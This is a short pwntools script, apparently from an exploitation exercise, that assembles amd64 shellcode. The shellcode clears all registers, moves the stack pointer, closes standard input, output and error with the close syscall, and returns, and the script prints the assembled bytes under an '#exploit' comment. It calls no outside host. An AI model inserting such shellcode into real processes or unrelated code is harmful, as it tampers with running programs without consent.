from pwn import *

#init

context.arch = 'amd64'

#vars

shellcode = '''\
mov r15, rdi

xor rax, rax
xor rbx, rbx
xor rcx, rcx
xor rdx, rdx
xor rdi, rdi
xor rsi, rsi
xor rbp, rbp
xor r8, r8
xor r9, r9
xor r10, r10
xor r11, r11
xor r12, r12
xor r13, r13
xor r14, r14
mov rsp, 0x100000000

mov r14, 0x3

loop:
dec r14
mov rdi, r14
mov rax, 0x3
syscall
test r14, r14
jnz loop

mov rax, r15

ret
'''

log.info('Shellcode: \n' + shellcode)

#exploit

print(asm(shellcode))
